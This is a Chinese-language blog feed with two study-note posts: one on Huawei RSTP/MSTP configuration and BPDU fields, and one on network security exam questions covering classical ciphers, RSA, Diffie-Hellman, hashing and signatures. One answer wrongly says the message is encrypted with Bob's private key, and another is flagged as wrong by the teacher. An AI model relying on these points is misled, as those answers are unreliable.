Delay所有端口才能进行转发。<br>而RSTP的主要目的就是消除这个瓶颈，通过阻塞自己的非根端口来保证不会出现环路。而使用P/A机制加快了上游端口进入Forwarding状态的速度。</p><h4 id="改进点6：拓扑变更机制"><a href="#改进点6：拓扑变更机制" class="headerlink" title="改进点6：拓扑变更机制"></a>改进点6：拓扑变更机制</h4><p>在RSTP中检测拓扑是否发生变化只有一个标准：一个非边缘端口迁移到Forwarding状态。</p><p>一旦检测到拓扑发生变化，将进行如下处理：<br>为本交换设备的所有非边缘指定端口和根端口启动一个TC While Timer，该计时器值是Hello Time的两倍。在这个时间内，清空状态发生变化的端口上学习到的MAC地址。<br>同时，由非边缘指定端口和根端口向外发送RST BPDU，其中TC置位。一旦TC While Timer超时，则停止发送RST BPDU。<br>其他交换设备接收到RST BPDU后，清空所有端口（除了收到RST BPDU的端口和边缘端口）学习到MAC地址，然后也为自己所有的非边缘指定端口和根端口启动TC While Timer，重复上述过程。<br>如此，网络中就会产生RST BPDU的泛洪。</p><h3 id="RSTP与STP的兼容"><a href="#RSTP与STP的兼容" class="headerlink" title="RSTP与STP的兼容"></a>RSTP与STP的兼容</h3><blockquote><p>RSTP可以兼容STP：RSTP可以和STP互操作，但是此时会丧失快速收敛等RSTP优势。</p></blockquote><p>当一个网段里既有运行STP的交换设备又有运行RSTP的交换设备，STP交换设备会忽略RSTP的BPDU</p><p>运行RSTP的交换设备在某端口上接收到运行STP的交换设备发出的配置BPDU，在两个Hello Time时间之后，便把自己的端口转换到STP工作模式，发送配置BPDU，从而实现了互操作。</p><h3 id="RSTP的基本配置"><a href="#RSTP的基本配置" class="headerlink" title="RSTP的基本配置"></a>RSTP的基本配置</h3><p>RSTP的配置指令与STP的基本配置指令相同此处介绍不同指令：</p><p><strong>设置RSTP</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei] stp mode rstp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>配置当前接口为边缘端口</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp edged-port enable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>缺省情况下，交换设备的所有端口都是非边缘端口。</p><h4 id="RSTP的保护功能配置命令"><a href="#RSTP的保护功能配置命令" class="headerlink" title="RSTP的保护功能配置命令"></a>RSTP的保护功能配置命令</h4><p><strong>配置BPDU保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei] stp bpdu-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备边缘端口的BPDU保护功能。缺省情况下，交换设备的BPDU保护功能处于禁用状态。</p><p><strong>配置根保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp root-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备的根保护功能。缺省情况下，端口的根保护功能处于去使能状态。当端口的角色是指定端口时，配置的根保护功能才生效。配置了根保护的端口，不可以配置环路保护</p><p><strong>配置环路保护功能</strong></p><pre class="line-numbers language-ensp" data-language="ensp"><code class="language-ensp">[Huawei-GigabitEthernet0&#x2F;0&#x2F;1] stp loop-protection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置交换设备根端口或Alternate端口的环路保护功能。缺省情况下，端口的环路保护功能处于关闭状态</p><p><strong>配置TC保护功能</strong></p><pre class="line-numbers language-none"><code class="language-none">[Huawei] stp tc-protection interval interval-value<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置设备处理阈值指定数量的拓扑变化报文所需的时间。缺省情况下，设备处理最大数量的拓扑变化报文所需的时间是Hello Time</p><h4 id="RSTP与STP的不足"><a href="#RSTP与STP的不足" class="headerlink" title="RSTP与STP的不足"></a>RSTP与STP的不足</h4><blockquote><p>流量无法负载分担 和 二层次优路径</p></blockquote><h2 id="多生成树协议（MSTP）"><a href="#多生成树协议（MSTP）" class="headerlink" title="多生成树协议（MSTP）"></a>多生成树协议（MSTP）</h2><blockquote><p>MSTP是IEEE 802.1S中定义的生成树协议，MSTP兼容STP和RSTP，既可以快速收敛，又提供了数据转发的多个冗余路径，在数据转发过程中实现VLAN数据的负载均衡</p></blockquote><p>MSTP可以将一个或多个VLAN映射到一个Instance（实例），再基于Instance计算生成树，映射到同一个Instance的VLAN共享同一棵生成树</p><h3 id="MSTP的基本概念"><a href="#MSTP的基本概念" class="headerlink" title="MSTP的基本概念"></a>MSTP的基本概念</h3><h4 id="MST-Region"><a href="#MST-Region" class="headerlink" title="MST Region"></a>MST Region</h4><ul><li><p>MSTP网络层次：</p><ul><li>MSTP把一个交换网络划分成多个域，每个域内形成多棵生成树，生成树之间彼此独立。</li></ul></li><li><p>MST Region（Multiple Spanning Tree Region，多生成树域），也可简称MST域</p><ul><li>由交换网络中的多台交换设备以及它们之间的网段所构成</li><li>一个局域网可以存在多个MST域，各MST域之间在物理上直接或间接相连。用户可以通过MSTP配置命令把多台交换设备划分在同一个MST域内</li><li>MSTP网络中包含1个或多个MST域，每个MST域中包含一个或多个多生成树实例。</li></ul></li><li><p>同一个MST域的设备具有下列特点：</p><ul><li>都启动了MSTP，具有相同的域名，具有相同的VLAN到生成树实例映射配置，具有相同的MSTP修订级别配置</li></ul></li></ul><h4 id="MSTI"><a href="#MSTI" class="headerlink" title="MSTI"></a>MSTI</h4><p>Multiple Spanning Tree Instance，多生成树实例：一个MST域内可以生成多棵生成树，每棵生成树都称为一个MSTI，MSTI使用Instance ID标识，华为设备取值为0~4094。</p><ul><li><p><strong>VLAN映射表</strong><br>MST域的属性，描述了VLAN和MSTI之间的映射关系。<br>如图所示的MST Region 4的VLAN映射有：</p><center><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\MST域与.png" style="zoom:67%;" />    ----->>>        <img src="D:\blog\shierjinghuang\source\_posts\生成树协议\多生成树实例.png" alt="多生成树实例" style="zoom: 67%;" /></center></li><li><p>VLAN1映射到MSTI 1，VLAN2映射到MSTI 2，其余VLAN映射到MSTI 3</p></li><li><p>Instance0是缺省存在的，而且缺省时，华为交换机上所有的VLAN都映射到了Instance0。</p></li><li><p>通过设置VLAN映射表，把VLAN和MSTI联系起来</p><p>每个VLAN只能对应一个MSTI，即同一VLAN的数据只能在一个MSTI中传输，而一个MSTI可能对应多个VLAN</p></li></ul><h4 id="CST（Common-Spanning-Tree，公共生成树）"><a href="#CST（Common-Spanning-Tree，公共生成树）" class="headerlink" title="CST（Common Spanning Tree，公共生成树）"></a>CST（Common Spanning Tree，公共生成树）</h4><p>是连接交换网络内所有MST域的一棵生成树。<br>如果把每个MST域看作是一个节点，CST就是这些节点通过生成树协议计算生成的一棵生成树。</p><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\交换网络实例.png" alt="交换网络实例" style="zoom: 50%;" /><p>如图深蓝色粗线条连接各个域构成CST。</p><p>IST（Internal Spanning Tree，内部生成树）<br>是各MST域内的一棵生成树。<br>IST是一个特殊的MSTI，MSTI的Instance ID为0。<br>如图所示的MST Region 4，黑色细线条在域中连接该域的所有交换设备构成IST。</p><p>CIST（Common and Internal Spanning Tree，公共和内部生成树）<br>通过生成树协议计算生成的，连接一个交换网络内所有交换设备的单生成树。<br>如图所示，所有MST域的IST加上CST就构成一棵完整的生成树，即CIST。</p><h3 id="MSTP的端口"><a href="#MSTP的端口" class="headerlink" title="MSTP的端口"></a>MSTP的端口</h3><h4 id="MSTP端口角色"><a href="#MSTP端口角色" class="headerlink" title="MSTP端口角色"></a>MSTP端口角色</h4><blockquote><p>MSTP中定义的所有端口角色包括：根端口、指定端口、Alternate端口、Backup端口、Master端口、域边缘端口和边缘端口</p></blockquote><table><thead><tr><th>端口角色</th><th align="left">说明</th></tr></thead><tbody><tr><td>根端口</td><td align="left">在非根桥上，离根桥最近的端口是本交换设备的根端口。根端口负责向树根方向转发数据</td></tr><tr><td>指定端口</td><td align="left">对一台交换设备而言，它的指定端口是向下游交换设备转发BPDU报文的端口。</td></tr><tr><td>Alternate端口</td><td align="left">从配置BPDU报文发送角度来看，Alternate端口就是由于学习到其它网桥发送的配置BPDU报文而阻塞的端口。从用户流量角度来看，Alternate端口提供了从指定桥到根的另一条可切换路径，作为根端口的备份端口。</td></tr><tr><td>Backup端口</td><td align="left">从配置BPDU报文发送角度来看，Backup端口就是由于学习到自己发送的配置BPDU报文而阻塞的端口。从用户流量角度来看，Backup端口作为指定端口的备份，提供了另外一条从根节点到叶节点的备份通路</td></tr></tbody></table><img src="D:\blog\shierjinghuang\source\_posts\生成树协议\MSTP端口角色.png" alt="MSTP端口角色" style="zoom:80%;" /><table><thead><tr><th><strong>端口角色</strong></th><th align="left">说明</th></tr></thead><tbody><tr><td>Master端口</td><td align="left">Master端口是MST域和总根相连的所有路径中最短路径上的端口，它是交换设备上连接MST域到总根的端口。Master端口是域中的报文去往总根的必经之路。Master端口是特殊域边缘端口，Master端口在CIST上的角色是Root Port，在其它各实例上的角色都是Master端口</td></tr><tr><td>域边缘端口</td><td align="left">域边缘端口是指位于MST域的边缘并连接其它MST域或SST的端口。</td></tr></tbody></table><table><thead><tr><th>端口角色</th><th>说明</th></tr></thead><tbody><tr><td>边缘端口</td><td>如果指定端口位于整个域的边缘，不再与任何交换设备连接，这种端口叫做边缘端口。边缘端口一般与用户终端设备直接连接</td></tr></tbody></table><h4 id="MSTP的端口状态"><a href="#MSTP的端口状态" class="headerlink" title="MSTP的端口状态"></a>MSTP的端口状态</h4><p>MSTP定义的端口状态与RSTP协议中定义相同:<br>Forwarding状态：端口既转发用户流量，学习MAC地址，又接收/发送BPDU报文。<br>Learning状态：过渡状态，端口接收/发送BPDU报文，不转发用户流量但是学习MAC地址。<br>Discarding状态：端口只接收BPDU报文，不转发用户流量也不学习MAC地址。</p><table><thead><tr><th>MSTP端口状态</th><th>端口在拓扑中的角色</th></tr></thead><tbody><tr><td><strong>Forwarding</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口</td></tr><tr><td><strong>Learning</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口</td></tr><tr><td><strong>Discarding</strong></td><td>包括根端口、指定端口、Master端口、域边缘端口、Alternate端口、Backup端口</td></tr></tbody></table><p>MSTP报文</p><p>MSTP使用MST BPDU（Multiple Spanning Tree Bridge Protocol Data Unit，多生成树桥协议数据单元）作为生成树计算的依据。<br>MST BPDU报文用来计算生成树的拓扑、维护网络拓扑以及传达拓扑变化记录。</p><p><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1678337096467.png"></p><p>无论是域内的MST BPDU还是域间的，前36个字节和RST BPDU相同。从第37个字节开始是MSTP专有字段。最后的MSTI配置信息字段由若干MSTI配置信息组连缀而成。<br>MST BPDU中主要信息说明：<br>Protocol Identifier：2 Byte，协议标识符。<br>Protocol Version Identifier：1 Byte，协议版本标识符，STP为0，RSTP为2，MSTP为3。<br>BPDU Type：1 Byte，BPDU类型：<br>0x00：STP的Configuration BPDU<br>0x80：STP的TCN BPDU（Topology Change Notification BPDU）<br>0x02：RST BPDU（Rapid Spanning-Tree BPDU）或者MST BPDU（Multiple Spanning-Tree BPDU）<br>CIST Flags：1 Byte，CIST标志字段。<br>CIST Root Identifier：8 Byte，CIST的总根交换设备ID。<br>CIST External Path Cost：4 Byte，CIST外部路径开销指从本交换设备所属的MST域到CIST根交换设备所属的MST域的累计路径开销。CIST外部路径开销根据链路带宽计算。</p><p>CIST Regional Root Identifier：8 Byte，CIST的域根交换设备ID，即IST Master的ID。如果总根在这个域内，那么域根交换设备ID就是总根交换设备ID。<br>CIST Port Identifier：2 Byte，本端口在IST中的指定端口ID。<br>Message Age：2 Byte，BPDU报文的生存期。<br>Max Age：2 Byte，BPDU报文的最大生存期，超时则认为到根交换设备的链路故障。<br>Hello Time：2 Byte，Hello定时器，缺省为2秒。<br>Forward Delay：2 Byte，Forward Delay定时器，缺省为15秒。<br>Version 1 Length：1 Byte，Version1 BPDU的长度，值固定为0。<br>Version 3 Length：2 Byte，Version3 BPDU的长度。<br>MST Configuration Identifier：51 Byte，MST配置标识，表示MST域的标签信息，包含4个字段。<br>CIST Internal Root Path Cost：4 Byte，CIST内部路径开销指从本端口到IST Master交换设备的累计路径开销。CIST内部路径开销根据链路带宽计算。<br>CIST Bridge Identifier：8 Byte，CIST的指定交换设备ID。<br>CIST Remaining Hops：1 Byte，BPDU报文在CIST中的剩余跳数。<br>MSTI Configuration Messages：16 Byte，MSTI配置信息。每个MSTI的配置信息占16 Byte，如果有n个MSTI就占用n×16 Byte。</p><p>MSTP的工作原理</p><p>MSTP拓扑计算：<br>MSTP可以将整个二层网络划分为多个MST域，各个域之间通过计算生成CST，域内生成IST，CST和IST构成了整个交换设备网络的CIST。<br>域内还可以基于实例计算生成多棵生成树，每棵生成树都被称为是一个MSTI。<br>CIST和MSTI都是根据优先级向量来计算的，这些优先级向量信息都包含在MST BPDU中。各交换设备互相交换MST BPDU来生成CIST和MSTI 。<br>参与CIST计算的优先级向量为：<br>{ 根交换设备ID，外部路径开销，域根ID，内部路径开销，指定交换设备ID，指定端口ID，接收端口ID }<br>参与MSTI计算的优先级向量为：<br>{ 域根ID，内部路径开销，指定交换设备ID，指定端口ID，接收端口ID }</p><p>优先级向量说明：<br>根交换设备ID：根交换设备ID用于选择CIST中的根交换设备。<br>根交换设备ID = Priority(16 bit) + MAC(48 bit)。<br>其中Priority为MSTI0的优先级。<br>外部路径开销（External Root Path Cost，ERPC）：从CIST的域根到达总根的路径开销。<br>MST域内所有交换设备上保存的外部路径开销相同。<br>若CIST根交换设备在域中，则域内所有交换设备上保存的外部路径开销为0。<br>域根ID：域根ID用于选择MSTI中的域根。<br>域根ID = Priority(16 bit) + MAC(48 bit)。<br>其中Priority为MSTI0的优先级。<br>内部路径开销（Internal Root Path Cost，IRPC）：本桥到达域根的路径开销。<br>域边缘端口保存的内部路径开销大于非域边缘端口保存的内部路径开销。<br>指定交换设备ID：CIST或MSTI实例的指定交换设备是本桥通往域根的最邻近的上游桥。<br>如果本桥就是总根或域根，则指定交换设备为自己。<br>指定端口ID：指定交换设备上同本设备上根端口相连的端口。<br>Port ID = Priority(4 bit) + 端口号（12 bit）。<br>端口优先级必须是16的整数倍。<br>接收端口ID：接收到BPDU报文的端口。<br>Port ID = Priority(4 bit) + 端口号（12 bit）。<br>端口优先级必须是16的整数倍。</p><p>优先级向量比较原则：<br>同一向量比较，值最小的向量具有最高优先级。<br>优先级向量比较原则如下<br>首先，比较根交换设备ID。<br>如果根交换设备ID相同，再比较外部路径开销。<br>如果外部路径开销相同，再比较域根ID。<br>如果域根ID仍然相同，再比较内部路径开销。<br>如果内部路径仍然相同，再比较指定交换设备ID。<br>如果指定交换设备ID仍然相同，再比较指定端口ID。<br>如果指定端口ID还相同，再比较接收端口ID。<br>如果端口接收到的BPDU内包含的配置消息优于端口上保存的配置消息，则端口上原来保存的配置消息被新收到的配置消息替代。端口同时更新交换设备保存的全局配置消息。反之，新收到的BPDU被丢弃。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;生成树的改进-RSTP与MSTP&quot;&gt;&lt;a href=&quot;#生成树的改进-RSTP与MSTP&quot; class=&quot;headerlink&quot; title=&quot;生成树的改进 RSTP与MSTP&quot;&gt;&lt;/a&gt;生成树的改进 RSTP与MSTP&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 </summary>
      
    
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/categories/HCIP/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
    <category term="网络工程" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络安全思考题</title>
    <link href="https://shierjinghuang.github.io/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/"/>
    <id>https://shierjinghuang.github.io/2023/03/03/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%9D%E8%80%83%E9%A2%98/</id>
    <published>2023-03-03T01:12:38.000Z</published>
    <updated>2023-03-05T10:27:40.493Z</updated>
    
    <content type="html"><![CDATA[<h2 id="计算机网络安全思考题："><a href="#计算机网络安全思考题：" class="headerlink" title="计算机网络安全思考题："></a>计算机网络安全思考题：</h2><h3 id="第一章概述"><a href="#第一章概述" class="headerlink" title="第一章概述"></a>第一章概述</h3><h4 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong>计算机网络安全的概念是什么？网络安全有哪几个特征？各特征的含义是什么？</strong></p><ul><li>网络安全指网络系统的软件硬件、以及系统存储和传输中的数据收到保护，不因偶然的或恶意的原因而遭到破坏、更改、泄露，网络系统连续可靠正常的运行，网络服务不中断。</li><li>网络安全的特征及含义：<ul><li>机密性： 指保证信息与信息系统不被非授权的用户实体或过程所获取与使用</li><li>完整性： 指信息在生成、传输、存储和使用过程中不应被第三方篡改</li><li>可用性 ：指信息与信息系统可被授权实体正常访问的特性，即授权实体在需要时能够存取所需信息</li><li>可控性 ：对信息的存取和传播具有完全的控制能力，可以控制信息的流向和行为方式</li><li>真实性 ： 包括信息的完整性，准确性和发送人的身份真实性等方面</li></ul></li></ul></li><li><p><strong><font color=red>列出并简述主动攻击与被动攻击的分类</font></strong> </p><p><font color=orange>被动攻击:    试图获取和使用系统中的信息 ，但是不会对系统的资源产生破坏，包括消息内容泄露和流量分析</font></p><p><font color=orange>主动攻击： 试图改变系统的资源或者伪装成系统中的合法用户进行操作， 包括假冒，重传，篡改和拒绝服务</font></p></li><li><p><strong>网络安全体系包括哪几个部分？各部分又由哪几个方面组成？</strong></p><ul><li>网络安全体系由网络安全技术体系、网络安全组织体系、网络安全管理体系三部分组成</li><li>网络安全技术体系包括：物理安全、计算机系统平台安全、通信安全、应用系统安全</li><li>网络安全组织体系： 网络安全组织体系是多个网络安全组织按照一定的关系汇集形成的一套组织系统<ul><li>我国的网络安全组织体系，一是国家信息安全管理、协调或服务组织系统，二是各政府机构内设的专门承担信息安全管理或服务工作的实体或虚体机构。</li></ul></li><li>网络安全管理体系由法律管理，制度管理和培训管路3个部分组成</li></ul></li></ul><h3 id="第二章-密码学"><a href="#第二章-密码学" class="headerlink" title="第二章 密码学"></a>第二章 密码学</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 古典密码学维吉尼亚密码与希尔密码</span><span class="token comment"># 如何利用公钥密码技术实现即加密又认证</span><span class="token comment"># 如何利用公钥密码技术实现混合加密</span><span class="token comment"># 本章重点：Diffe-Hellman 秘钥交换协议 D-h的中间人攻击（简答）</span><span class="token comment"># Diffe-Hellman安全性分析</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="计算题："><a href="#计算题：" class="headerlink" title="计算题："></a>计算题：</h4><h5 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h5><p>该密码体制有一个参数n。在加解密时，同样把英文字母映射为0－25的数字再进行运算，并按n个字母一组进行变换。明文空间、密文空间及密钥空间都是长度为n的英文字母串的集合，因此可表示 </p><blockquote><p>加密变换定义如下：</p><p>设密钥 k=(k1,k2,…,kn), 明文m=(m1,m2,…,mn), 加密变换为：Ek(m)=(c1,c2,…,cn), 其中ci(mi + ki)(mod26)，i =1,2,…,n</p><p>对密文 c=(c1,c2,…,cn),  解密变换为：Dk(c)=(m1,m2,…,mn), 其中 mi=(ci －ki)(mod26)，i =1,2,…,n</p></blockquote><h5 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h5><blockquote><p>Hill密码算法的基本思想是将n个明文字母通过线性变换，将它们转换为n个密文字母，解密即做逆变换</p></blockquote><p>算法的密钥K ={ <img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1676351740534.png" style="zoom:67%;" />上的N·N的可逆矩阵}，明文M与密文C均为n维向量</p><p>其中：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算.png" style="zoom: 67%;" /><p>有</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码计算矩阵形式.png" style="zoom: 80%;" /><p>或写成</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码加密.png" style="zoom:67%;" /><p>解密变换则为：</p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/希尔密码解密.png" style="zoom:67%;" /><h5 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h5><ul><li><p>密钥的生成</p><ol><li>选择两个大素数 p，q，（p，q为互异素数，需要保密）</li><li>计算n = p×q， ψ(n) = (p－1)×(q－1)</li><li>选择整数 e 使 (ψ(n)，e) =1,   1&lt;e&lt; ψ(n) </li><li>计算d，使d = e－1mod ψ(n),</li><li>得到：公钥 为{e,n}； 私钥为{d}</li></ol></li><li><p>加密(用e，n):         明文：M &lt; n， 密文C = M ^ e(mod n)</p></li><li><p>解密(用d，n)：      密文C， 明文M = C ^ d (mod n)</p></li></ul><h5 id="Diffe-Hellman-秘钥交换协议"><a href="#Diffe-Hellman-秘钥交换协议" class="headerlink" title="Diffe-Hellman 秘钥交换协议"></a>Diffe-Hellman 秘钥交换协议</h5><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/Diffe-Hellman 秘钥交换协议.png" style="zoom: 67%;" /><h4 id="综合题："><a href="#综合题：" class="headerlink" title="综合题："></a>综合题：</h4><ul><li><p><strong><font color=orange>如何利用公钥密码技术实现    即加密又认证 （综合题）</font></strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/公钥密码技术实现加密及认证.png" style="zoom:50%;" /><p>提供保密：KUb        提供鉴别和签名:KRa    明文消息M</p><blockquote><p><font color=orange>Alice用自己的私钥进行数字签名，并与源文件一起用Bob的私钥进行加密</font></p><p><font color=orange>Bob在收到数据后用自己的私钥进行解密，并可以用Alice的公钥进行验证</font></p></blockquote></li><li><p><strong><font color=orange>如何利用公钥密码技术实现    混合加密 （综合题）</font></strong></p></li></ul><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/混合加密计算.png" style="zoom: 50%;" /><ul><li><p><strong><font color=orange>Diffe-Hellman安全性分析 (综合题)</font></strong></p><blockquote><p>网络安全课本P55页</p></blockquote><ul><li><p>Diffie-Hellman算法的优点:</p><ol><li>仅当需要时才生成密钥,减小了将密钥存储很长一段时间而致使遭受攻击的机会</li><li>除对全局参数的约定外,密钥交换不需要事先存在的基础结构</li></ol></li><li><p>缺点：</p><ol><li>在协商密钥的过程中,没有对双方身份的认证</li><li>它是计算密集性的,因此容易遭受阻塞性攻击:攻击方请求大量的密钥,而受攻击者花费了相对多的计算资源来求解无用的幂系数而不是在做真正的工作</li><li>没办法防止重放攻击</li><li>容易遭受”中间人攻击”，即恶意第三方C在和A通信时扮演B,和B通信时扮演A,与A和B都协商了一个密钥,然后C就可以监听和传递通信量</li></ol></li></ul></li></ul><h4 id="思考题：-1"><a href="#思考题：-1" class="headerlink" title="思考题："></a>思考题：</h4><ul><li><p><strong><font color=red>简述密码体制及其组成成分：</font></strong></p><ul><li>用于加解密并能解决网络安全中的机密性、完整性、可用性、可控性和真实性等问题中的一个或几个的系统称为密码体制</li><li>包括密文空间C，明文空间P，秘钥空间K , 加密算法E，与解密算法D</li></ul></li><li><p><strong>简述对称密码算法的基本原理</strong></p><ul><li>对称算法又叫传统密码算法:加密密钥能够从解密密钥中推算出来,反过来也成立。</li><li>对称算法要求发送者和接收者在安全通信之前,协商一个密钥。</li><li>对称算法的安全性依赖于密钥,泄漏密钥就意味着任何人都能对消息进行加解密。</li><li>对称算法的加密和解密表示为:EK(M)=C </li></ul></li><li><p><strong>简述对称密码算法和非对称密码算法的区别：</strong></p><ul><li><p>在对称密码体制中，加密和解密使用完全相同的秘钥，或者加密秘钥和解密秘钥彼此之间非常容易推导。在公钥密码体系中，加密和解密使用不同的秘钥，而且由其中的一个推导另一个是非常困难的。在两个秘钥中，一个是公开的，而另一个保持秘密性<del>（老师表示这个答案有错）</del></p></li><li><p>在安全性方面，对称密钥密码体制是基于复杂的非线性变换与迭代运算实现算法安全性的，而非对称密钥密码体制则一般是基于某个公认的数学难题而实现安全性的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这部分来自密码学课件，至少比课本上全面</span>对称秘钥密码体制：加密、解密运算的处理速度块，效率高，算法安全性高，对称密码算法的密钥分发过程复杂，所花代价高； 密钥管理量的困难；保密通信系统的开放性差； 存在数字签名的困难性非对称密码体制：密钥分配简单，系统密钥量少，便于管理 ，系统开放性好，且可以实现数字签名。加密、解密运算效率较低，处理速度较慢，同等安全强度下，非对称密码体制的密钥位数较多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong><font color=red>RSA算法的理论基础是什么？简述RSA算法的流程？</font></strong></p><ul><li>大整数的素因子分解是困难问题，即求两个大素数的乘积是容易的，但是将一个大整数分解成两个大素数之积则是困难的<ul><li>选取两个大素数p和q，两个数长度接近，一般在256比特长</li><li>计算n=p * q, ψ(n)=(p-1)(q-1)</li><li>随机选取整数e，满足gcd(e, ψ(n))=1</li><li>计算d，满足d*e=1（modψ(n)）</li><li>n公开， p和q保密   e为公钥，d为私钥。</li><li>消息m &lt; n<br>加密算法：c=E(m)=m^e   (mod n)<br>解密算法：m=D(c)=c^d   (mod n)<br>签名： s=md(mod n)</li></ul></li></ul></li><li><p> <strong><font color=orange>D-h的中间人攻击（简答）</font></strong></p></li></ul>  <img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/D-h的中间人攻击.png"  /><h3 id="第三章-消息鉴别与数字签名"><a href="#第三章-消息鉴别与数字签名" class="headerlink" title="第三章 消息鉴别与数字签名"></a>第三章 消息鉴别与数字签名</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># 考点：消息加密 ， MAC函数 ， 哈希函数 ， 公钥密码签名等 ， A - B 公钥加密与签名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h4><ul><li><p><strong>消息鉴别主要用于对抗哪种类型的攻击？</strong></p><ul><li>消息鉴别主要用于对抗伪造消息和篡改消息（包括内容篡改，序号篡改与时间篡改）</li></ul></li><li><p><strong><font color=red>根据鉴别符的生成方式，鉴别函数可分为哪几类？各自具有什么特点？（掌握）</font></strong></p></li><li><p>基于鉴别符的生成方式，鉴别函数可分为如下3类：</p></li><li><p>基于消息加密方式的鉴别：以<strong>整个消息的密文为鉴别符</strong></p><ul><li>基于消息鉴别码（MAC）的鉴别：利用公开函数和秘钥产生一个较短的定长值作为鉴别符，并与消息一同发送给接收方，实现对消息的验证。</li><li>基于散列函数的鉴别：利用公开函数将任意长的消息映射为定长的散列值，并以该散列值作为鉴别符</li></ul></li><li><p><strong><font color=red>散列函数应该具有哪些安全特性？（掌握）</font></strong></p></li><li><p>散列函数必须满足一定的安全特征，主要包括3个方面：单向性、强对抗碰撞性和弱对抗碰撞性</p><ul><li>单向性：对任意给定的散列码h，找到满足H（x）=h的x在计算上是不可行的，即给定散列函数h，由消息M计算散列值H(M)是容易的，但是由散列值H(M)计算</li><li>强对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h，寻找两个不同的消息M1和M2，使得h (M1) = h (M2)在计算上是不可行的</li><li>弱对抗碰撞性：散列函数满足，散列函数h的输入是任意长度的的消息M，散列函数h的输出是定长的数值，给定h和M计算h(M)是容易的，给定散列函数h和一个随机的消息M，寻找消息M1使得h (M) = H(M1)在计算上是不可行的。</li></ul></li><li><p><strong><font color=skyblue>什么是数字签名？数字签名具有哪些特征？（理解）</font></strong></p></li><li><p>数字签名是手写签名的数字化形式，是公钥密码学发展过程中最重要的概念之一<del>（是指附加在某一电子文档中的一组特定的符号或代码）</del>  删除线内是课件的内容</p><ul><li>数字签名的特征<ul><li>可验证性：信息接收方必须能够验证发送发的签名是否真实有效</li><li>不可伪造性： 除签名人外，任何人不能伪造签名人的合法签名。</li><li>不可否认性： 发送放在发送签名消息后。无法抵赖发送的行为；接收方在收到消息后，也无法否认接收的行为</li><li>数据完整性： 数字签名使得发送方能够对消息的完整性进行校验<del>（数字签名具有消息鉴别的功能）</del></li></ul></li></ul></li><li><p><strong>简述基于公钥密码的数字签名原理？</strong></p><ul><li>假定接收方已知发送放的公钥，则发送放则可以用自己的私钥对整个消息或消息的散列码加密来产生数字签名，接受放用发送方的公钥对签名进行验证从而确认签名和消息的真实性</li></ul></li></ul><h3 id="第四章-身份认证"><a href="#第四章-身份认证" class="headerlink" title="第四章 身份认证"></a>第四章 身份认证</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"># Kerberos    X.509版本3 包含哪一些字段    PKI体系结构<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="思考题-1"><a href="#思考题-1" class="headerlink" title="思考题"></a>思考题</h4><p><strong><font color=orange>思考题2,3,4综合复习（？）</font></strong></p><ul><li><p><font 